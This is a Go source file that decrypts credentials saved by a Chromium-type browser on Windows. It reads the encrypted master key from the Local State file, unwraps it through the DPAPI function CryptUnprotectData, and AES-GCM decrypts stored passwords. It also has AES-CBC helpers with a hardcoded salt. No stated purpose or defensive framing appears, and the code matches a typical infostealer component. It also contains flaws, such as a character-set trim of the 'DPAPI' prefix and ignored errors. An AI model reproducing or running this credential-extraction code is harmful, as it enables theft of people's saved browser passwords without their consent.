package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"golang.org/x/crypto/pbkdf2"
	"io"
	"io/ioutil"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

const (
	salt        = "CHUJ"
	keySize     = 32
	iteration   = 65536
	ivSize      = aes.BlockSize
	paddingSize = 16
)

func EncryptData(data []byte, master string) ([]byte, error) {
	// Generate a derived key from the master password and salt
	derivedKey := pbkdf2.Key([]byte(master), []byte(salt), iteration, keySize, sha256.New)

	// Generate a random initialization vector (IV)
	iv := make([]byte, ivSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	// Create a new AES cipher block
	block, err := aes.NewCipher(derivedKey)
	if err != nil {
		return nil, err
	}

	// Apply PKCS#7 padding to the data
	paddedData := padData(data)

	// Create a cipher block mode for AES CBC mode
	mode := cipher.NewCBCEncrypter(block, iv)

	// Encrypt the data
	encryptedData := make([]byte, len(paddedData))
	mode.CryptBlocks(encryptedData, paddedData)

	// Prepend the IV to the encrypted data
	encryptedDataWithIV := append(iv, encryptedData...)

	return encryptedDataWithIV, nil
}

func DecryptData(data []byte, master string) ([]byte, error) {
	// Generate a derived key from the master password and salt
	derivedKey := pbkdf2.Key([]byte(master), []byte(salt), iteration, keySize, sha256.New)

	// Extract the IV from the data
	iv := data[:ivSize]

	// Create a new AES cipher block
	block, err := aes.NewCipher(derivedKey)
	if err != nil {
		return nil, err
	}

	// Create a cipher block mode for AES CBC mode
	mode := cipher.NewCBCDecrypter(block, iv)

	// Decrypt the data (excluding the IV)
	decryptedData := make([]byte, len(data)-ivSize)
	mode.CryptBlocks(decryptedData, data[ivSize:])

	// Remove PKCS#7 padding from the decrypted data
	unpaddedData := unpadData(decryptedData)

	return unpaddedData, nil
}

func padData(data []byte) []byte {
	padding := paddingSize - (len(data) % paddingSize)
	padText := strings.Repeat(string(byte(padding)), padding)
	return append(data, []byte(padText)...)
}

func unpadData(data []byte) []byte {
	padding := int(data[len(data)-1])
	return data[:len(data)-padding]
}

func DecryptPassword(buff, masterKey []byte) string {
	iv := buff[3:15]
	payload := buff[15:]

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "Error while creating cipher block: " + err.Error()
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "Error while creating GCM block: " + err.Error()
	}

	decrypted, err := aesgcm.Open(nil, iv, payload, nil)
	if err != nil {
		return "Error while decrypting password: " + err.Error()
	}

	return string(decrypted)
}

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func GetMasterKey(localStatePath string) ([]byte, error) {
	var masterKey []byte

	jsonFile, err := os.Open(localStatePath)
	if err != nil {
		return masterKey, err
	}

	defer jsonFile.Close()

	byteValue, err := ioutil.ReadAll(jsonFile)
	if err != nil {
		return masterKey, err
	}
	var result map[string]interface{}

	_ = json.Unmarshal(byteValue, &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)
	stringKey := string(decodedKey)
	stringKey = strings.Trim(stringKey, "DPAPI")

	masterKey, err = Decrypt([]byte(stringKey))
	if err != nil {
		return masterKey, err
	}

	return masterKey, nil
}
